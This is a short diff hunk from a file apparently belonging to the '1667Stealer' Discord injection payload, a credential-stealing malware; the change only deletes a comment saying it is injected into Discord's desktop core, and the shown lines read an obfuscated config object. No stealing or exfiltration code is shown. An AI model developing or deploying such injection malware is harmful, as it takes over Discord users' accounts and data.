@@ -1,6 +1,5 @@
 // ============================================================
 //  injection.js — 1667Stealer Discord Injection Payload
-//  Gets injected into Discord's discord_desktop_core
 // ============================================================
 
 const config = typeof CONFIG_OBF === "object" ? CONFIG_OBF : {};
